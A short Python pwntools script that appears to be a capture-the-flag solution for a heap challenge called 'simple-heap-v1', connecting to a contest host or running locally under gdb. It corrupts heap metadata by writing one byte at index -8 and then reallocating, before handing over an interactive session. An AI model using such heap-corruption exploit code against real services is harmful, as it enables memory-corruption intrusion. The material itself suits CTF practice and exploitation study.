#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./simple-heap-v1"
#libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("amt.rs", 31176)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
        b *main+275
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)

p.sendlineafter(':', str(0x8))
p.sendafter(':', b'A' * 0x8)
p.sendlineafter(':', str(0x10))
p.sendafter(':', b'B' * 0x10)
index = -8
new_char = b'\xb0'
p.sendlineafter(':', str(index))
p.sendlineafter(':', new_char)
p.sendlineafter(':', str(0xa0))
p.sendafter(':', b'C' * 0xa0)

p.interactive()
